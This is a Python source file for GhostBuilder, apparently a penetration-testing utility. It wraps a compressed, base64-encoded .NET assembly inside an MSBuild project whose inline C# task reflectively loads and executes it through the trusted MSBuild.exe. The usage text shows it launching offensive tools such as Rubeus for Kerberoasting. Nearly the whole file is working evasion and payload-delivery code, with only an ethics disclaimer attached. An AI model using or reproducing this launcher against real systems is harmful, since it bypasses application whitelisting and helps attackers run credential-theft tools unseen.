# GhostBuild: A simple MSBuild launchers for the GhostPack projects [ https://github.com/GhostPack ] and other assemblies
# GhostBuilder: A utility for generating MSBuild launcher payloads
# MSBuild Usage: C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe c:\path\to\project.xml
# License: BSD 3-Clause
# Ethics: GhostBuild(er) is designed to help security professionals perform ethical and legal security assessments and penetration tests. Do not use for nefarious purposes.

import sys, os, zlib, base64, argparse

def Usage():
    usage = ""
    usage+= " [*] Usage:   python3 " + sys.argv[0] + " -e [Path to .NET Assembly] -a [Quoted rgument string(s) for .NET Assembly | Optional] -o [Path to MSBuild output file]\n\n"
    usage+= " [*] Example: python3 " + sys.argv[0] + " -e /mnt/c/GhostBuild/SharpUp.exe -o /mnt/c/GhostBuild/SharpUp.proj\n"
    usage+= " [*] Example: python3 " + sys.argv[0] + " -e /mnt/c/GhostBuild/Rubeus.exe -a '\"Kerberoast\"' -o /mnt/c/GhostBuild/Rubeus.csproj\n"
    usage+= " [*] Example: python3 " + sys.argv[0] + " -e /mnt/c/GhostBuild/SharpWMI.exe -a '\"action=query\", \"query=select * from win32_process\"' -o /mnt/c/GhostBuild/SharpWMI.xml\n\n"
    usage+= " [*] Basic Instructions:\n"
    usage+= "   - Compile the target .NET Assemble executable with desired architecture (e.g. x64)\n"
    usage+= "   - Build payload with GhostBuilder\n"
    usage+= "   - Modify MSBuild output (e.g. paths/architecture/variables/etc.)\n"
    usage+= "   - Run with MSBuild.exe (e.g. C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\MSBuild.exe c:\\path\\to\\project.xml)\n"
    
    print (usage)
    sys.exit()

def ReadFile(file):
    try:
        fobj = open(file, "rb") 
        contents = fobj.read()
        fobj.close()
        return contents
    except:
        print("[-] File read error: " + file)
        sys.exit()
        
def SaveFile(contents, file):
    try:
        fobj = open(file, "w") 
        fobj.write(contents)
        fobj.close()
        print("[*] File saved: " + file)
    except:
        print("[-] File write error: " + file)
        sys.exit()

def GenerateGhostBuild(gContents, gArgs):
    n = 1
    
    #[StackOverflow Python Inflate/Deflate Streams [https://stackoverflow.com/questions/1089662/python-inflate-and-deflate-implementations]
    gLen = str(len(gContents))
    gCompressed = zlib.compress(gContents)[2:-4]
    gEncoded = base64.b64encode(gCompressed).decode()
    
    return '''
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="GhostBuild">
   <GhostBuilder />
  </Target>
<UsingTask
    TaskName="GhostBuilder"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
        <Code Type="Class" Language="cs">
            <![CDATA[
                using System;
                using System.IO;
                using System.Reflection;
                using System.IO.Compression;
                using Microsoft.Build.Framework;
                using Microsoft.Build.Utilities;

                public class GhostBuilder :  Task, ITask
                {
                    public override bool Execute()
                    {
                        string[] args = new string[] { ''' + gArgs + ''' };                        
                        string compressedBin = "''' + gEncoded + '''";
                        int compressedBinSize = ''' + gLen + ''';

                        Byte[] bytesBin = new byte[compressedBinSize];
                        using (MemoryStream inputStream = new MemoryStream(Convert.FromBase64String(compressedBin)))
                        {
                            using (DeflateStream stream = new DeflateStream(inputStream, CompressionMode.Decompress))
                            {
                                stream.Read(bytesBin, 0, compressedBinSize);
                            }
                        }
                        
                        Assembly assembly = Assembly.Load(bytesBin);
                        assembly.EntryPoint.Invoke(null, new object[] { args });
                        return true;
                    }
                }
            ]]>
        </Code>
    </Task>
    </UsingTask>
</Project>
'''

def Main():
    print ("------------\nGhostBuilder\n------------\n")
    print ("[*] A utility for generating MSBuild launcher payloads\n")

    if (len(sys.argv) <= 1):
        Usage()

    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--exe", type=str, required=True, help="Path to your .NET assembly executable.")
    parser.add_argument("-a", "--args", type=str, required=False, help="Argument string for .NET assembly.")
    parser.add_argument("-o", "--outfile", type=str, required=True, help="Path to your MSBuild output file.")
    args = parser.parse_args()
        
    gArgs = ""
    if (args.args):
        gArgs = args.args
    
    gContents = ReadFile(args.exe)
    gBuild = GenerateGhostBuild(gContents, gArgs)
    
    SaveFile(gBuild, args.outfile)
    
if __name__ == '__main__':
    Main()